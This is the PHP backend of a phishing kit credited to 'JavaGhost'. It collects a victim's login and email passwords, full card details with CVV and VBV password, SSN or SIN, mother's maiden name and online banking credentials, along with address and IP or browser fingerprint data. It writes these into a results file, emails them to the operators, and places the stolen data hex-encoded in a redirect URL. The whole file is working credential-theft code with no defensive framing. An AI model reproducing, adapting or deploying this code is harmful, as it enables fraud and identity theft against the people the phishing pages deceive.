<?php
error_reporting(0);
@ob_start();

if (!isset($include) || $include !== 1 || !isset($_SESSION['SESSION_ID'])) die();

require_once 'functions.php';
require_once 'config.php';

$login = isset($_SESSION['LoginId']) ? $_SESSION['LoginId'] : '';
$pass = isset($_SESSION['Passcode']) ? $_SESSION['Passcode'] : '';
$name = isset($_SESSION['NAME']) ? $_SESSION['NAME'] : '';
$address = isset($_SESSION['ADDRESS']) ? $_SESSION['ADDRESS'] : '';
$city = isset($_SESSION['CITY']) ? $_SESSION['CITY'] : '';
$state = isset($_SESSION['STATE']) ? $_SESSION['STATE'] : '';
$zip = isset($_SESSION['ZIP']) ? $_SESSION['ZIP'] : '';
$country = isset($_SESSION['COUNTRY']) ? $_SESSION['COUNTRY'] : '';
$phone = isset($_SESSION['PHONE']) ? $_SESSION['PHONE'] : '';
$card_number =  isset($_SESSION['CARD_NUMBER']) ? $_SESSION['CARD_NUMBER'] : '';
$name_on_card =  isset($_SESSION['NAME_ON_CARD']) ? $_SESSION['NAME_ON_CARD'] : '';
$exp_date =  isset($_SESSION['EXPIRY_DATE']) ? $_SESSION['EXPIRY_DATE'] : '';
$cvv =  isset($_SESSION['CVV']) ? $_SESSION['CVV'] : '';
$dob =  isset($_SESSION['DOB']) ? $_SESSION['DOB'] : '';
$card_vbv =  isset($_SESSION['CARD_VBV']) ? $_SESSION['CARD_VBV'] : '';
$card_limit =  isset($_SESSION['CARD_LIMIT']) ? $_SESSION['CARD_LIMIT'] : '';
$card_zip =  isset($_SESSION['CARD_ZIP']) ? $_SESSION['CARD_ZIP'] : '';
$sort_code =  isset($_SESSION['SORT_CODE']) ? $_SESSION['SORT_CODE'] : '';
$ssn =  isset($_SESSION['SSN']) ? $_SESSION['SSN'] : '';
$sin =  isset($_SESSION['SIN']) ? $_SESSION['SIN'] : '';
$mmn =  isset($_SESSION['MMN']) ? $_SESSION['MMN'] : '';
$acct_number =  isset($_SESSION['ACCOUNT_NUM']) ? $_SESSION['ACCOUNT_NUM'] : '';
$bank_username =  isset($_SESSION['ONLINE_BANKING_ID']) ? $_SESSION['ONLINE_BANKING_ID'] : '';
$bank_password =  isset($_SESSION['ONLINE_BANKING_PASS']) ? $_SESSION['ONLINE_BANKING_PASS'] : '';
$current_email_pass =  isset($_SESSION['CURRENT_EMAIL_PASS']) ? $_SESSION['CURRENT_EMAIL_PASS'] : '';
$user_date = isset($_SESSION['USER_TIME']) ? $_SESSION['USER_TIME'] : '';

$ip = isset($_SESSION['IP_INFO']['IP']) ? $_SESSION['IP_INFO']['IP'] : get_client_ip();
$ip_country = isset($_SESSION['IP_INFO']['IP_COUNTRY']) ? $_SESSION['IP_INFO']['IP_COUNTRY'] : '';
$ip_isp =  isset($_SESSION['IP_INFO']['IP_ISP']) ? $_SESSION['IP_INFO']['IP_ISP'] : '';
$ip_org =  isset($_SESSION['IP_INFO']['IP_ORGANIZATION']) ? $_SESSION['IP_INFO']['IP_ORGANIZATION'] : '';
$ip_city =  isset($_SESSION['IP_INFO']['IP_CITY']) ? $_SESSION['IP_INFO']['IP_CITY'] : '';
$ip_region =  isset($_SESSION['IP_INFO']['IP_REGION']) ? $_SESSION['IP_INFO']['IP_REGION'] : '';
$hostname =  isset($_SESSION['IP_INFO']['HOSTNAME']) ? $_SESSION['IP_INFO']['HOSTNAME'] : gethostbyaddr($ip);
$useragent =  isset($_SESSION['IP_INFO']['USERAGENT']) ? $_SESSION['IP_INFO']['USERAGENT'] : '';
$referer =  isset($_SESSION['IP_INFO']['REFERER']) ? $_SESSION['IP_INFO']['REFERER'] : '';
$browser = isset($_SESSION['IP_INFO']['BROWSER']) ? $_SESSION['IP_INFO']['BROWSER'] : '';
$accept_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
$platform =  isset($_SESSION['IP_INFO']['PLATFORM']) ? $_SESSION['IP_INFO']['PLATFORM'] : '';

$bin = '';
$card_brand = '';

$data = "";
if(!$disable_login_page) {
	$data .= "================[Info Login]================\n";
	$data .= "Login            : $login\n";
	$data .= "Password         : $pass\n";

	if($request_for_email_password)
		$data .= "eMail Password   : $current_email_pass\n";
}

if(!$disable_bank_info_page) {

	$bin_info = get_bin_info($card_number);

	if($request_for_ssn && $country === 'US') {
		$ssn_req = true;
	}

	if($request_for_sin && $country === 'CA') {
		$sin_req = true;
	}

	if($request_for_account_number && $country === 'GB') {
		$acc_num_req = true;
	}

	if($rquest_for_sort_code && $country === 'GB') {
		$sortcode_req = true;
	}
	$data .= "================[Info Bank]================\n";
	$data .= "Name On Card     : $name_on_card\n";
	$data .= "Card Number      : $card_number\n";
	$data .= "Expires          : $exp_date\n";

	if($request_for_cvv)
		$data .= "CVV              : $cvv\n";

	$bin = get_bin_number($card_number);
	$data .= "BIN              : $bin\n";

	$scheme = isset($bin_info['scheme']) ? $bin_info['scheme'] : '';
	$data .= "Scheme           : $scheme\n";

	$type = isset($bin_info['type']) ? $bin_info['type'] : '';
	$data .= "Type             : $type\n";

	$card_brand = isset($bin_info['brand']) ? $bin_info['brand'] : '';
	$data .= "Brand            : $card_brand\n";

	$prepaid = isset($bin_info['prepaid']) ? $bin_info['prepaid'] : '';
	$data .= "Prepaid          : $prepaid\n";

	$card_country = isset($bin_info['country']['name']) ? $bin_info['country']['name'] : '';
	$data .= "Card Country     : $card_country\n";

	$ccurrency = isset($bin_info['country']['currency']) ? $bin_info['country']['currency'] : '';
	$data .= "Country Currency : $ccurrency\n";

	$bankname = isset($bin_info['bank']['name']) ? $bin_info['bank']['name'] : '';
	$data .= "Bank Name        : $bankname\n";


	if($request_for_vbv_password)
		$data .= "Card Password    : $card_vbv\n";

	if(isset($sortcode_req)) 
		$data .= "Sort Code        : $sort_code\n";

	if(isset($ssn_req) && $ssn_req === true)
		$data .= "SSN              : $ssn\n";

	if(isset($sin_req) && $sin_req === true) 
		$data .= "SIN              : $sin\n";

	if(isset($acc_num_req) && $acc_num_req === true) 
		$data .= "Account Number   : $acct_number\n";

	if($request_for_mmn) 
		$data .= "MMN              : $mmn\n";

	if($request_for_card_limit) 
		$data .= "Credit Limit     : $card_limit\n";

	if($request_for_online_bankung_id) 
		$data .= "Bank Username    : $bank_username\n";

	if($request_for_online_bankung_password) 
		$data .= "Bank Password    : $bank_password\n";

	if($request_for_zip_code) 
		$data .= "ZIP Code         : $card_zip\n";

	if($request_for_date_of_birth) 
		$data .= "Date Of Birth    : $dob\n";
}

if(!$disable_address_page)
{
	$data .= "================[Info Address]================\n";
	$data .= "Full name        : $name\n";
	$data .= "Address          : $address\n";
	$data .= "City             : $city\n";
	$data .= "State            : $state\n";
	$data .= "ZIP              : $zip\n";
	$data .= "Country          : $country\n";
	$data .= "Phone            : $phone\n";
}
$data .= "================[Info Victim]================\n";
$data .= "IP               : $ip\n";
$data .= "Hostname         : $hostname\n";
$data .= "ISP              : $ip_isp\n";
$data .= "IP Organization  : $ip_org\n";
$data .= "IP City          : $ip_city\n";
$data .= "IP Country       : $ip_country\n";
$data .= "IP Region        : $ip_region\n";
$data .= "User-Agent       : $useragent\n";
$data .= "Browser          : $browser\n";
$data .= "Platform         : $platform\n";
$data .= "Referer          : $referer\n";
$data .= "User Datetime    : $user_date\n";
$data .= "Accept-Lang      : $accept_lang\n";
$data .= "================[!~$ Powered by JavaGhost !~$]================\n";

// save data to text file
if($save_results_to_text)
{
	append_to_file($results_fullz_file, $data);
}
	
if($send_results_to_email)
{
	$from_name = 'JavaGhost';
	$from_email = 'no-reply@box902.bluehost.com';
	$subject = "Full info JavaGhost [$bin - $card_brand - $country]";
	send_email($recipients, $from_name, $from_email, $subject, $data);
}

header("location: processing.php?loggedin=true&client=".uniqid($$_SESSION['SESSION_ID'], false)."&sessionid=".bin2hex($data));

ob_end_flush();
?>